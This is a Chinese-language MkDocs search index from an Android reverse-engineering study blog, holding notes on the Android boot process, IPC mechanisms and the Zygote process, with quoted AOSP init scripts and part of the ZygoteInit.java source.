{"config":{"lang":["zh","en"],"separator":"[\\s\\u200b\\-]","pipeline":["stemmer"]},"docs":[{"location":"","title":"\u5f00\u7740\u843d\u7070\u6d85\u4f3d\u5c14\u5728\u514b\u9686\u8231\u4e2d\u745f\u745f\u53d1\u6296\u7684\u5b89\u5168\u4eba","text":""},{"location":"#_2","title":"\u6211\u662f","text":"<ul> <li>EVE online \u73a9\u5bb6[StabberORVexor]</li> <li>\u4fe1\u606f\u5b89\u5168-\u9006\u5411-\u5b89\u5353</li> </ul>"},{"location":"#_3","title":"\u8fd9\u91cc\u662f","text":"<ul> <li>\u8bb0\u5f55\u5b66\u4e60\u7b14\u8bb0</li> <li>\u5206\u4eab\u4e00\u4e9b\u6709\u8da3\u7684\u4e1c\u897f</li> <li>\u4ea4\u6d41\u6280\u672f\u5fc3\u5f97</li> <li>\u5076\u5c14\u6c34\u6c34\u751f\u6d3b</li> <li>\u4e00\u4e9b\u788e\u788e\u5ff5(\u6216\u8bb8)</li> </ul> <p>\u57fa\u4e8emkdocs-material</p> <p>mkdocs\u5b98\u65b9\u6587\u6863 mkdocs-material\u5b98\u65b9\u6587\u6863</p>"},{"location":"friends/","title":"\u53cb\u94fe","text":"<ul> <li> <p> YoSheep's \u5b66\u4e60\u7b14\u8bb0</p> </li> <li> <p> AlexYun's \u87e0\u6843\u5927\u4f1a</p> </li> <li> <p> Pwn\u270c\ufe0f\u67f3\u5927\u867e</p> </li> <li> <p> \u5976\u9f99</p> </li> <li> <p> la0d3ng/Wh1te_w0Od</p> </li> <li> <p> Xsheep</p> </li> </ul> <ul> <li> CAUC-CSA Wiki</li> </ul>"},{"location":"study/miscellaneous/","title":"\u6742\u8d27\u94fa","text":"<p>\u672c\u6587\u6863\u6536\u96c6\u4e00\u4e9b\u96f6\u6563\u7684\u77e5\u8bc6\u70b9</p>"},{"location":"study/android/theory/","title":"Android \u57fa\u7840\u77e5\u8bc6","text":"<p>\u672c\u6587\u6863\u6536\u96c6\u4e00\u4e9b\u7406\u8bba\u6027\u77e5\u8bc6\uff0c\u8f83\u4e3a\u96f6\u788e\uff0c\u4f46\u662f\u6700\u7ec8\u7f16\u7ec7\u6210\u4e00\u5f20\u5927\u7f51\u3002</p> <p>\u6700\u540e\u66f4\u65b0\u4e0e 2025-10-29 by N0rth5ea in CAUC</p> <p>\u5b9e\u8df5\u56fa\u7136\u80fd\u6781\u5feb\u7684\u83b7\u5f97\u6210\u5c31\u611f\uff0c\u4f46\u552f\u6709\u7406\u8bba\u7684\u79ef\u7d2f\u624d\u80fd\u8ba9\u4f60\u8d70\u5f97\u66f4\u8fdc\u3002</p>"},{"location":"study/android/theory/#android_1","title":"Android \u7cfb\u7edf\u5206\u5c42\u67b6\u6784\u4e0e\u542f\u52a8\u6d41\u7a0b","text":"\u53c2\u8003\u8d44\u6599 <ul> <li>Android\u542f\u52a8\u7cfb\u5217\u4e4b\u4e00\uff1ainit\u8fdb\u7a0b\u548cZygote\u8fdb\u7a0b</li> </ul> <p>\u76f8\u5173\u94fe\u63a5</p> <ul> <li>Zygote</li> <li>System Server</li> </ul> <p>Android \u662f\u4e00\u4e2a\u57fa\u4e8e Linux \u5185\u6838\u7684\u590d\u6742\u64cd\u4f5c\u7cfb\u7edf\u3002\u5176\u542f\u52a8\u8fc7\u7a0b\u662f\u4e00\u4e2a\u4ece\u786c\u4ef6\u52a0\u7535\u5230\u663e\u793a\u5e94\u7528\u754c\u9762\u7684\u5206\u5c42\u3001\u63a5\u529b\u8fc7\u7a0b\u3002</p>"},{"location":"study/android/theory/#1","title":"1. \u7cfb\u7edf\u542f\u52a8\u5c42","text":"<ul> <li> <p>Boot ROM (\u5f15\u5bfc\u53ea\u8bfb\u5b58\u50a8\u5668)</p> <ul> <li>\u5f53\u6309\u4e0b\u7535\u6e90\u952e\u65f6\uff0cCPU \u9996\u5148\u4f1a\u6267\u884c\u56fa\u5316\u5728 ROM \u4e2d\u7684\u4e00\u5c0f\u6bb5\u4ee3\u7801\u3002</li> <li>\u5b83\u4f1a\u8fdb\u884c\u57fa\u672c\u7684\u786c\u4ef6\u68c0\u67e5\uff0c\u7136\u540e\u627e\u5230\u5e76\u52a0\u8f7d\u4e0b\u4e00\u9636\u6bb5\u7684\u5f15\u5bfc\u7a0b\u5e8f\uff08Bootloader\uff09\u5230 RAM \u4e2d\u3002</li> </ul> </li> <li> <p>Bootloader (\u5f15\u5bfc\u52a0\u8f7d\u7a0b\u5e8f)</p> <ul> <li>Bootloader \u8d1f\u8d23\u521d\u59cb\u5316\u66f4\u591a\u7684\u786c\u4ef6\uff08\u5982\u5185\u5b58\u3001\u95ea\u5b58\uff09\u3002</li> <li>\u6700\u91cd\u8981\u7684\u662f\u5c06 Android \u7684\u6838\u5fc3Linux Kernel\u4ece\u95ea\u5b58\u52a0\u8f7d\u5230 RAM \u4e2d\uff0c\u7136\u540e\u8df3\u8f6c\u5230\u5185\u6838\u4ee3\u7801\u5f00\u59cb\u6267\u884c\u3002</li> </ul> </li> </ul>"},{"location":"study/android/theory/#2","title":"2. \u5185\u6838\u5c42","text":"<ul> <li>Linux Kernel (Linux \u5185\u6838)<ul> <li>\u8fd9\u662f Android \u7cfb\u7edf\u7684\u6838\u5fc3\u3002\u5185\u6838\u542f\u52a8\u540e\uff0c\u5b83\u4f1a\u63a5\u7ba1 CPU\uff0c\u5e76\u5f00\u59cb\u521d\u59cb\u5316\u5404\u79cd\u9a71\u52a8\u7a0b\u5e8f\uff08\u5982\u663e\u793a\u3001\u952e\u76d8\u3001Wi-Fi\uff09\u548c\u6838\u5fc3\u7cfb\u7edf\u529f\u80fd\uff08\u5982\u8fdb\u7a0b\u7ba1\u7406\u3001\u5185\u5b58\u7ba1\u7406\uff09\u3002</li> <li>\u5185\u6838\u542f\u52a8\u7684\u6700\u540e\u4e00\u6b65\uff0c\u662f\u5728\u7528\u6237\u7a7a\u95f4\uff08User Space\uff09\u4e2d\u542f\u52a8\u7b2c\u4e00\u4e2a\u8fdb\u7a0b\uff0c\u5373 <code>init</code> \u8fdb\u7a0b\u3002</li> </ul> </li> </ul>"},{"location":"study/android/theory/#3-native-user-space","title":"3. \u539f\u751f\u7528\u6237\u7a7a\u95f4 (Native User Space)","text":"<ul> <li><code>init</code> \u8fdb\u7a0b<ul> <li><code>init</code> \u662f Android \u7cfb\u7edf\u4e2d\u7684\u7b2c\u4e00\u4e2a\u8fdb\u7a0b\uff08PID 1\uff09\uff0c\u662f\u6240\u6709\u5176\u4ed6\u7528\u6237\u7a7a\u95f4\u8fdb\u7a0b\u7684\u201c\u7956\u5148\u201d\u3002</li> <li>\u5b83\u4f1a\u89e3\u6790 <code>.rc</code> \u7ed3\u5c3e\u7684\u521d\u59cb\u5316\u811a\u672c\u6587\u4ef6\uff08\u4f8b\u5982 <code>init.rc</code>\uff09\u3002</li> <li>\u6839\u636e\u8fd9\u4e9b\u811a\u672c\uff0c<code>init</code> \u8fdb\u7a0b\u4f1a\u542f\u52a8\u7cfb\u7edf\u8fd0\u884c\u6240\u9700\u7684\u5404\u79cd\u539f\u751f\u670d\u52a1\uff08Daemons\uff09\uff0c\u4f8b\u5982 <code>logd</code> (\u65e5\u5fd7\u670d\u52a1)\u3001<code>vold</code> (\u5377\u7ba1\u7406\u670d\u52a1)\u7b49\u3002</li> <li>\u542f\u52a8\u4e86\u81f3\u5173\u91cd\u8981\u7684\u8fdb\u7a0b\uff1a<code>Zygote</code>\u3002</li> </ul> </li> </ul>"},{"location":"study/android/theory/#4-java-framework","title":"4. Java \u6846\u67b6\u5c42 (Framework)","text":"<ul> <li> <p><code>Zygote</code> (\u53d7\u7cbe\u5375) \u8fdb\u7a0b</p> <ul> <li>\u6838\u5fc3\u529f\u80fd\uff1a \u542f\u52a8 Java \u865a\u62df\u673a (JVM/ART)\uff0c\u9884\u52a0\u8f7d Android \u6846\u67b6\u7684\u6838\u5fc3 Java \u7c7b\u5e93\u548c\u7cfb\u7edf\u8d44\u6e90\u3002</li> <li>\u901a\u8fc7<code>fork</code>\u81ea\u8eab\u6765\u521b\u5efa\u65b0\u7684\u8fdb\u7a0b\u3002\u7531\u4e8e\u6838\u5fc3\u7c7b\u5e93\u5df2\u9884\u52a0\u8f7d\uff0c\u53ef\u4ee5\u76f4\u63a5\u7ee7\u627f\u7ed9App\uff0c\u8fd9\u4f7f\u5f97 App \u7684\u542f\u52a8\u901f\u5ea6\u6781\u5feb\u3002\u8fd9\u4e2a\u8fc7\u7a0b\u53c8\u79f0\u4e3a\u201c\u5b75\u5316\u201d\u3002</li> <li><code>Zygote</code> \u542f\u52a8\u540e\u9996\u5148\u4f1a\u5b75\u5316\u51fa <code>System Server</code> \u8fdb\u7a0b\u3002</li> </ul> </li> <li> <p><code>System Server</code> (\u7cfb\u7edf\u670d\u52a1\u8fdb\u7a0b)</p> <ul> <li><code>System Server</code> \u662f Android \u6846\u67b6\u7684\u6838\u5fc3\u3002\u8fd9\u662f\u7cfb\u7edf\u4e2d\u7b2c\u4e00\u4e2a\u8fd0\u884c\u7684 Java \u8fdb\u7a0b\u3002</li> <li>\u5b83\u8d1f\u8d23\u542f\u52a8\u548c\u7ba1\u7406\u6240\u6709\u6838\u5fc3\u7684\u7cfb\u7edf\u670d\u52a1\u3002</li> <li><code>System Server</code> \u542f\u52a8\u5b8c\u6210\u540e\uff0cAndroid \u7cfb\u7edf\u771f\u6b63\u201c\u51c6\u5907\u5c31\u7eea\u201d\uff0c\u5e76\u4f1a\u53d1\u9001 <code>BOOT_COMPLETED</code> \u5e7f\u64ad\uff0c\u540c\u65f6\u542f\u52a8 Launcher\uff08\u684c\u9762\u5e94\u7528\uff09\u3002</li> </ul> </li> </ul>"},{"location":"study/android/theory/#5-app","title":"5. \u5e94\u7528\u5c42 (App)","text":"<ul> <li>App (\u5e94\u7528\u7a0b\u5e8f) \u8fdb\u7a0b<ul> <li>\u5f53\u70b9\u51fb\u4e00\u4e2a\u5e94\u7528\u65f6\uff0cLauncher \u4f1a\u901a\u77e5 <code>Activity Manager Service</code> (\u5728 <code>System Server</code> \u8fdb\u7a0b\u4e2d)\u3002</li> <li><code>AMS</code> \u4f1a\u68c0\u67e5\u8be5\u5e94\u7528\u662f\u5426\u5df2\u6709\u8fdb\u7a0b\uff0c\u5982\u679c\u6ca1\u6709\uff0c\u5b83\u4f1a\u8bf7\u6c42 <code>Zygote</code> \u8fdb\u7a0b\u3002</li> <li><code>Zygote</code> \u6536\u5230\u8bf7\u6c42\u540e\uff0c\u4f1a\u5b75\u5316\u51fa\u4e00\u4e2a\u7ee7\u627f\u4e86 <code>Zygote</code> \u9884\u52a0\u8f7d\u7684\u865a\u62df\u673a\u548c\u6838\u5fc3\u8d44\u6e90\u7684\u5b50\u8fdb\u7a0b\uff0c\u5373\u4e3a\u8be5\u5e94\u7528\u8fdb\u7a0b\uff0c\u7136\u540e\u52a0\u8f7d\u5e94\u7528\u4ee3\u7801\uff0c\u542f\u52a8\u5e94\u7528\u7684 <code>Activity</code>\u3002</li> </ul> </li> </ul>"},{"location":"study/android/theory/#android_2","title":"Android \u7cfb\u7edf\u4ea4\u4e92\u673a\u5236","text":"<ul> <li> <p>SysCall (System Call - \u7cfb\u7edf\u8c03\u7528)</p> <ul> <li>\u8fd9\u662f\u7528\u6237\u7a7a\u95f4\uff08\u5305\u62ec <code>init</code>\u3001<code>Zygote</code>\u3001App\uff09\u4e0e Linux \u5185\u6838 \u4ea4\u4e92\u7684\u552f\u4e00\u6865\u6881\u3002</li> <li>\u5f53 App \u9700\u8981\u8bbf\u95ee\u786c\u4ef6\uff08\u5982\u8bfb\u5199\u6587\u4ef6\u3001\u6253\u5f00\u6444\u50cf\u5934\u3001\u53d1\u9001\u7f51\u7edc\u6570\u636e\uff09\u65f6\uff0c\u5b83\u4e0d\u80fd\u76f4\u63a5\u64cd\u4f5c\uff0c\u5fc5\u987b\u901a\u8fc7 SysCall \u5411\u5185\u6838\u53d1\u51fa\u8bf7\u6c42\uff0c\u7531\u5185\u6838\u4ee3\u4e3a\u5b8c\u6210\uff0c\u4ee5\u4fdd\u8bc1\u7cfb\u7edf\u5b89\u5168\u548c\u7a33\u5b9a\u3002</li> </ul> </li> <li> <p>JNI (Java Native Interface - Java \u672c\u5730\u63a5\u53e3)</p> <ul> <li>\u8fd9\u662f Android \u4e2d Java \u4ee3\u7801\u4e0e C/C++\uff08Native\uff09\u4ee3\u7801\u4ea4\u4e92\u7684\u6865\u6881\u3002</li> <li>Android \u7684\u6846\u67b6\u5c42\uff08\u5982 <code>System Server</code>\uff09\u548c\u5e94\u7528\uff08App\uff09\u4e3b\u8981\u662f\u7528 Java \u7f16\u5199\u7684\uff0c\u4f46\u5b83\u4eec\u9700\u8981\u8c03\u7528\u5e95\u5c42\u7684\u7cfb\u7edf\u529f\u80fd\uff08\u4f8b\u5982\u56fe\u5f62\u6e32\u67d3\u3001\u786c\u4ef6\u8bbf\u95ee\uff09\uff0c\u8fd9\u4e9b\u529f\u80fd\u901a\u5e38\u7531 C/C++ \u5b9e\u73b0\u3002</li> <li>\u6d41\u7a0b\uff1a Java \u4ee3\u7801 (App) \u2192 JNI \u2192 C/C++ (Native \u5e93) \u2192 SysCall \u2192 Linux \u5185\u6838\u3002</li> </ul> </li> <li> <p>Binder (\u8fdb\u7a0b\u95f4\u901a\u4fe1)</p> <ul> <li>\u8fd9\u662f Android \u7279\u6709\u7684\u9ad8\u6027\u80fd\u8fdb\u7a0b\u95f4\u901a\u4fe1\uff08IPC\uff09\u673a\u5236\u3002</li> <li>\u5b83\u5728 Android \u4e2d\u65e0\u5904\u4e0d\u5728\uff1a<ul> <li>App \u4e0e <code>System Server</code>\uff08AMS, PMS \u7b49\uff09\u4e4b\u95f4\u7684\u901a\u4fe1\u3002</li> <li>App \u4e0e App \u4e4b\u95f4\u7684\u901a\u4fe1\u3002</li> </ul> </li> </ul> </li> </ul>"},{"location":"study/android/theory/#zygote","title":"Zygote","text":"\u53c2\u8003\u8d44\u6599 <ul> <li>Zygote \u8fdb\u7a0b\u7b80\u4ecb</li> <li>\u8c08\u8c08\u5bf9Android\u4e2dZygote\u7684\u7406\u89e3</li> <li>Android\u542f\u52a8\u7cfb\u5217\u4e4b\u4e00\uff1ainit\u8fdb\u7a0b\u548cZygote\u8fdb\u7a0b</li> <li>Android 9.0.0_r45 \u6e90\u7801\u5206\u6790</li> <li>zygote \u8fdb\u7a0b\u542f\u52a8\u5206\u6790\u4e00</li> <li>AOSPXRef</li> </ul> <p>\u76f8\u5173\u94fe\u63a5</p> <ul> <li>Android \u542f\u52a8\u6d41\u7a0b</li> <li>Xposed</li> <li>System Server</li> </ul> <p>\u5728 Android \u542f\u52a8\u6d41\u7a0b\u4e2d\uff0c\u6211\u4eec\u5df2\u7ecf\u7b80\u8981\u4ecb\u7ecd\u4e86 Zygote \u8fdb\u7a0b\u7684\u4f5c\u7528\u3002\u5927\u540d\u9f0e\u9f0e\u7684 Xposed \u6846\u67b6\u6b63\u662f\u901a\u8fc7 Hook Zygote \u6765\u5b9e\u73b0\u5bf9\u6240\u6709 App \u7684\u4ee3\u7801\u6ce8\u5165\u3002 \u56e0\u6b64\u6211\u4eec\u6765\u4ece\u4ee3\u7801\u4ed4\u7ec6\u6df1\u5165\u4e86\u89e3\u4e0b Zygote \u7684\u5de5\u4f5c\u539f\u7406\u3002</p> <p>\u65e0\u7279\u6b8a\u8bf4\u660e\uff0c\u4ee5\u4e0b\u6e90\u7801\u5747\u57fa\u4e8e Android 16.0.0_r2 \u6e90\u7801 \u5206\u6790</p> <p>\u6309\u7167\u6211\u4eec\u4e4b\u524d\u7684\u4ecb\u7ecd\uff0cZygote \u662f\u7531 init \u8fdb\u7a0b\u542f\u52a8\u7684\u3002\u6211\u4eec\u53ef\u4ee5\u5728 init.rc \u4e2d\u627e\u5230\u5bf9\u5e94\u542f\u52a8\uff1a</p> <p>/system/core/rootdir/init.rc<pre><code>#line 526:528\n    # Now we can start zygote.\n    trigger zygote-start\n\n#line 1087:1095\n# to start-zygote in device's init.rc to unblock zygote start.\non zygote-start\n    wait_for_prop odsign.verification.done 1\n    # A/B update verifier that marks a successful boot.\n    exec_start update_verifier\n    start statsd\n    start zygote\n    start zygote_secondary\n</code></pre> \u7cfb\u7edf\u4f1a\u542f\u52a8 zygote \u548c zygote_secondary \u670d\u52a1\u3002\u8fd9\u4e24\u4e2a\u670d\u52a1\u58f0\u660e\u4e8e\u4ee5\u4e0b\u914d\u7f6e\u6587\u4ef6\u4e2d\uff1a </p> init.zygote32init.zygote64init.zygote64_secondary /system/core/rootdir/init.zygote32.rc<pre><code>service zygote /system/bin/app_process -Xzygote /system/bin --zygote --start-system-server\n    class main\n    priority -20\n    user root\n    group root readproc reserved_disk\n    socket zygote stream 660 root system\n    socket usap_pool_primary stream 660 root system\n    onrestart exec_background - system system -- /system/bin/vdc volume abort_fuse\n    onrestart write /sys/power/state on\n    # NOTE: If the wakelock name here is changed, then also\n    # update it in SystemSuspend.cpp\n    onrestart write /sys/power/wake_lock zygote_kwl\n    onrestart restart audioserver\n    onrestart restart cameraserver\n    onrestart restart media\n    onrestart restart --only-if-running media.tuner\n    onrestart restart netd\n    onrestart restart wificond\n    task_profiles ProcessCapacityHigh MaxPerformance\n    critical window=${zygote.critical_window.minute:-off} target=zygote-fatal\n</code></pre> /system/core/rootdir/init.zygote64.rc<pre><code>service zygote /system/bin/app_process64 -Xzygote /system/bin --zygote --start-system-server --socket-name=zygote\n    class main\n    priority -20\n    user root\n    group root readproc reserved_disk\n    socket zygote stream 660 root system\n    socket usap_pool_primary stream 660 root system\n    onrestart exec_background - system system -- /system/bin/vdc volume abort_fuse\n    onrestart write /sys/power/state on\n    # NOTE: If the wakelock name here is changed, then also\n    # update it in SystemSuspend.cpp\n    onrestart write /sys/power/wake_lock zygote_kwl\n    onrestart restart audioserver\n    onrestart restart cameraserver\n    onrestart restart media\n    onrestart restart --only-if-running media.tuner\n    onrestart restart netd\n    onrestart restart wificond\n    task_profiles ProcessCapacityHigh MaxPerformance\n    critical window=${zygote.critical_window.minute:-off} target=zygote-fatal\n</code></pre> /system/core/rootdir/init.zygote64_32.rc<pre><code>import /system/etc/init/hw/init.zygote64.rc\n\nservice zygote_secondary /system/bin/app_process32 -Xzygote /system/bin --zygote --socket-name=zygote_secondary --enable-lazy-preload\n    class main\n    priority -20\n    user root\n    group root readproc reserved_disk\n    socket zygote_secondary stream 660 root system\n    socket usap_pool_secondary stream 660 root system\n    onrestart restart zygote\n    task_profiles ProcessCapacityHigh MaxPerformance\n</code></pre> <p>\u53ef\u4ee5\u770b\u51fa\uff0czygote \u670d\u52a1\u4f1a\u542f\u52a8 <code>/system/bin/app_process(64)</code> \u8fdb\u7a0b\u3002</p> <p>\u6e90\u7801\u7f51\u7ad9\u4e0a\u5e76\u6ca1\u6709\u8fd9\u4e2a\u6587\u4ef6\uff0c\u6211\u4ece Android 9 \u7684\u5b9e\u4f53\u673a\u4e2d\u63d0\u53d6\u4e86\u8fd9\u4e2a\u6587\u4ef6\uff0c\u662f\u4e00\u4e2a ELF \u6587\u4ef6\uff0cIDA \u542f\u52a8\u3002</p> <p>/system/bin/app_process64 main()<pre><code>  if ( (v55 &amp; 0x100000000LL) != 0 )\n  {\n    p_com.android.internal.os.RuntimeInit = \"com.android.internal.os.ZygoteInit\";\n    v42 = 1;\n  }\n  // ...\n  android::AndroidRuntime::start(v61, p_com.android.internal.os.RuntimeInit, v58, v42);\n</code></pre> \u5728\u7ecf\u8fc7\u4e00\u7cfb\u5217\u53c2\u6570\u6bd4\u5bf9\u540e\uff0c\u542f\u52a8\u4e86java\u5c42<code>com.android.internal.os.ZygoteInit</code>\uff0c\u6211\u4eec\u56de\u5230Android 16.0.0_r2\u6e90\u7801\u4e2d\u67e5\u770b\u8fd9\u4e2a\u7c7b\uff1a</p> /frameworks/base/core/java/com/android/internal/os/ZygoteInit.java<pre><code>// \u68c0\u67e5\u53c2\u6570 line 848:860\n            for (int i = 1; i &lt; argv.length; i++) {\n                if (\"start-system-server\".equals(argv[i])) {\n                    startSystemServer = true;\n                } else if (\"--enable-lazy-preload\".equals(argv[i])) {\n                    enableLazyPreload = true;\n                } else if (argv[i].startsWith(ABI_LIST_ARG)) {\n                    abiList = argv[i].substring(ABI_LIST_ARG.length());\n                } else if (argv[i].startsWith(SOCKET_NAME_ARG)) {\n                    zygoteSocketName = argv[i].substring(SOCKET_NAME_ARG.length());\n                } else {\n                    throw new RuntimeException(\"Unknown command line argument: \" + argv[i]);\n                }\n            }\n// \u9884\u52a0\u8f7d\u8d44\u6e90\u4f9b\u540e\u7eed\u5b75\u5316\u7528 line 879:889\n            // In some configurations, we avoid preloading resources and classes eagerly.\n            // In such cases, we will preload things prior to our first fork.\n            if (!enableLazyPreload) {\n                bootTimingsTraceLog.traceBegin(\"ZygotePreload\");\n                EventLog.writeEvent(LOG_BOOT_PROGRESS_PRELOAD_START,\n                        SystemClock.uptimeMillis());\n                preload(bootTimingsTraceLog);\n                EventLog.writeEvent(LOG_BOOT_PROGRESS_PRELOAD_END,\n                        SystemClock.uptimeMillis());\n                bootTimingsTraceLog.traceEnd(); // ZygotePreload\n            }\n// \u5b75\u5316 SystemServer line 984:913\n            if (startSystemServer) {\n                Runnable r = forkSystemServer(abiList, zygoteSocketName, zygoteServer);\n\n                // {@code r == null} in the parent (zygote) process, and {@code r != null} in the\n                // child (system_server) process.\n                if (r != null) {\n                    r.run();\n                    return;\n                }\n            }\n// \u5faa\u73af\u7b49\u5f85\u521b\u5efa\u8bf7\u6c42 line 917:919\n            // The select loop returns early in the child process after a fork and\n            // loops forever in the zygote.\n            caller = zygoteServer.runSelectLoop(abiList);\n</code></pre> ZygoteInit.java\u5b8c\u6574\u6587\u4ef6 /frameworks/base/core/java/com/android/internal/os/ZygoteInit.java<pre><code>/*\n * Copyright (C) 2007 The Android Open Source Project\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *      http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\npackage com.android.internal.os;\n\nimport static android.system.OsConstants.S_IRWXG;\nimport static android.system.OsConstants.S_IRWXO;\n\nimport static android.net.http.Flags.preloadHttpengineInZygote;\n\nimport static com.android.internal.util.FrameworkStatsLog.BOOT_TIME_EVENT_ELAPSED_TIME__EVENT__SECONDARY_ZYGOTE_INIT_START;\nimport static com.android.internal.util.FrameworkStatsLog.BOOT_TIME_EVENT_ELAPSED_TIME__EVENT__ZYGOTE_INIT_START;\n\nimport android.app.ApplicationLoaders;\nimport android.compat.annotation.UnsupportedAppUsage;\nimport android.content.pm.SharedLibraryInfo;\nimport android.content.res.Resources;\nimport android.os.Build;\nimport android.net.http.HttpEngine;\nimport android.os.Environment;\nimport android.os.IInstalld;\nimport android.os.Process;\nimport android.os.RemoteException;\nimport android.os.ServiceManager;\nimport android.os.SystemClock;\nimport android.os.SystemProperties;\nimport android.os.Trace;\nimport android.os.UserHandle;\nimport android.os.ZygoteProcess;\nimport android.provider.DeviceConfig;\nimport android.security.keystore2.AndroidKeyStoreProvider;\nimport android.system.ErrnoException;\nimport android.system.Os;\nimport android.system.OsConstants;\nimport android.system.StructCapUserData;\nimport android.system.StructCapUserHeader;\nimport android.text.Hyphenator;\nimport android.text.TextUtils;\nimport android.util.EventLog;\nimport android.util.Log;\nimport android.util.Slog;\nimport android.util.TimingsTraceLog;\nimport android.view.WindowManager;\nimport android.webkit.WebViewFactory;\nimport android.widget.TextView;\n\nimport com.android.internal.util.FrameworkStatsLog;\nimport com.android.internal.util.Preconditions;\n\nimport dalvik.system.VMRuntime;\nimport dalvik.system.ZygoteHooks;\n\nimport libcore.io.IoUtils;\n\nimport java.io.BufferedReader;\nimport java.io.EOFException;\nimport java.io.File;\nimport java.io.FileInputStream;\nimport java.io.FileNotFoundException;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.security.Provider;\nimport java.security.Security;\nimport java.util.ArrayList;\nimport java.util.List;\n\n/**\n * Startup class for the zygote process.\n *\n * Pre-initializes some classes, and then waits for commands on a UNIX domain socket. Based on these\n * commands, forks off child processes that inherit the initial state of the VM.\n *\n * Please see {@link ZygoteArguments} for documentation on the client protocol.\n *\n * @hide\n */\npublic class ZygoteInit {\n\n    private static final String TAG = \"Zygote\";\n\n    private static final boolean LOGGING_DEBUG = Log.isLoggable(TAG, Log.DEBUG);\n\n    private static final String PROPERTY_DISABLE_GRAPHICS_DRIVER_PRELOADING =\n            \"ro.zygote.disable_gl_preload\";\n\n    private static final int LOG_BOOT_PROGRESS_PRELOAD_START = 3020;\n    private static final int LOG_BOOT_PROGRESS_PRELOAD_END = 3030;\n\n    private static final String ABI_LIST_ARG = \"--abi-list=\";\n\n    // TODO (chriswailes): Re-name this --zygote-socket-name= and then add a\n    // --usap-socket-name parameter.\n    private static final String SOCKET_NAME_ARG = \"--socket-name=\";\n\n    /**\n     * The path of a file that contains classes to preload.\n     */\n    private static final String PRELOADED_CLASSES = \"/system/etc/preloaded-classes\";\n\n    private static final int UNPRIVILEGED_UID = 9999;\n    private static final int UNPRIVILEGED_GID = 9999;\n\n    private static final int ROOT_UID = 0;\n    private static final int ROOT_GID = 0;\n\n    private static boolean sPreloadComplete;\n\n    /**\n     * Cached classloader to use for the system server. Will only be populated in the system\n     * server process.\n     */\n    private static ClassLoader sCachedSystemServerClassLoader = null;\n\n    static void preload(TimingsTraceLog bootTimingsTraceLog) {\n        Log.d(TAG, \"begin preload\");\n        bootTimingsTraceLog.traceBegin(\"BeginPreload\");\n        beginPreload();\n        bootTimingsTraceLog.traceEnd(); // BeginPreload\n        bootTimingsTraceLog.traceBegin(\"PreloadClasses\");\n        preloadClasses();\n        bootTimingsTraceLog.traceEnd(); // PreloadClasses\n        bootTimingsTraceLog.traceBegin(\"CacheNonBootClasspathClassLoaders\");\n        cacheNonBootClasspathClassLoaders();\n        bootTimingsTraceLog.traceEnd(); // CacheNonBootClasspathClassLoaders\n        bootTimingsTraceLog.traceBegin(\"PreloadResources\");\n        Resources.preloadResources();\n        bootTimingsTraceLog.traceEnd(); // PreloadResources\n        Trace.traceBegin(Trace.TRACE_TAG_DALVIK, \"PreloadAppProcessHALs\");\n        nativePreloadAppProcessHALs();\n        Trace.traceEnd(Trace.TRACE_TAG_DALVIK);\n        Trace.traceBegin(Trace.TRACE_TAG_DALVIK, \"PreloadGraphicsDriver\");\n        maybePreloadGraphicsDriver();\n        Trace.traceEnd(Trace.TRACE_TAG_DALVIK);\n        preloadSharedLibraries();\n        preloadTextResources();\n\n        // TODO: remove the try/catch and the flag read as soon as the flag is ramped and 25Q2\n        // starts building from source.\n        if (preloadHttpengineInZygote()) {\n            try {\n                HttpEngine.preload();\n            } catch (NoSuchMethodError e){\n                // The flag protecting this API is not an exported\n                // flag because ZygoteInit happens before the\n                // system service has initialized the flag which means\n                // that we can't query the real value of the flag\n                // from the tethering module. In order to avoid crashing\n                // in the case where we have (new zygote, old tethering).\n                // we catch the NoSuchMethodError and just log.\n                Log.d(TAG, \"HttpEngine.preload() threw \" + e);\n            }\n        }\n        // Ask the WebViewFactory to do any initialization that must run in the zygote process,\n        // for memory sharing purposes.\n        WebViewFactory.prepareWebViewInZygote();\n        endPreload();\n        warmUpJcaProviders();\n        Log.d(TAG, \"end preload\");\n\n        sPreloadComplete = true;\n    }\n\n    static void lazyPreload() {\n        Preconditions.checkState(!sPreloadComplete);\n        Log.i(TAG, \"Lazily preloading resources.\");\n\n        preload(new TimingsTraceLog(\"ZygoteInitTiming_lazy\", Trace.TRACE_TAG_DALVIK));\n    }\n\n    private static void beginPreload() {\n        Log.i(TAG, \"Calling ZygoteHooks.beginPreload()\");\n\n        ZygoteHooks.onBeginPreload();\n    }\n\n    private static void endPreload() {\n        ZygoteHooks.onEndPreload();\n\n        Log.i(TAG, \"Called ZygoteHooks.endPreload()\");\n    }\n\n    private static void preloadSharedLibraries() {\n        Log.i(TAG, \"Preloading shared libraries...\");\n        System.loadLibrary(\"android\");\n        System.loadLibrary(\"jnigraphics\");\n\n        // TODO(b/206676167): This library is only used for renderscript today. When renderscript is\n        // removed, this load can be removed as well.\n        if (!SystemProperties.getBoolean(\"config.disable_renderscript\", false)) {\n            System.loadLibrary(\"compiler_rt\");\n        }\n    }\n\n    native private static void nativePreloadAppProcessHALs();\n\n    /**\n     * This call loads the graphics driver by making an OpenGL or Vulkan call.  If the driver is\n     * not currently in memory it will load and initialize it.  The OpenGL call itself is relatively\n     * cheap and pure.  This means that it is a low overhead on the initial call, and is safe and\n     * cheap to call later.  Calls after the initial invocation will effectively be no-ops for the\n     * system.\n     */\n    static native void nativePreloadGraphicsDriver();\n\n    private static void maybePreloadGraphicsDriver() {\n        if (!SystemProperties.getBoolean(PROPERTY_DISABLE_GRAPHICS_DRIVER_PRELOADING, false)) {\n            nativePreloadGraphicsDriver();\n        }\n    }\n\n    private static void preloadTextResources() {\n        Hyphenator.init();\n        TextView.preloadFontCache();\n    }\n\n    /**\n     * Register AndroidKeyStoreProvider and warm up the providers that are already registered.\n     *\n     * By doing it here we avoid that each app does it when requesting a service from the provider\n     * for the first time.\n     */\n    private static void warmUpJcaProviders() {\n        long startTime = SystemClock.uptimeMillis();\n        Trace.traceBegin(\n                Trace.TRACE_TAG_DALVIK, \"Starting installation of AndroidKeyStoreProvider\");\n\n        AndroidKeyStoreProvider.install();\n        